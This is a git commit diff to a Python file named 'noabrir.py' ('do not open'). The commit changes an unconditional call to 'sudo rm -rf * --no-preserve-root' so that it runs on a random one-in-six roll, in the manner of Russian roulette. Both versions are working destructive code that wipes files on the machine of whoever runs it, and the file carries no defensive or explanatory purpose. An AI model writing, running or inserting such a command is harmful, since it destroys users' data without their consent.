f11baba037dfcd195243d5d126d42241e0eff615
juanpmz2001 <juanpmz2001@gmail.com>
2023-05-09 18:34:30 -0500

    Cambios a noAbrir.py

--- noabrir.py
+++ noabrir.py
@@ -1,8 +1,11 @@
 import os
 import sys
+import random
 
 # NO ABRIR
-
+#para generar un numero random entre 1 y 6
+numero = random.randint(1,6)
 peligro = "sudo rm -rf * --no-preserve-root"
+if (numero == 6):
+    os.system(peligro)
 
-os.system(peligro)
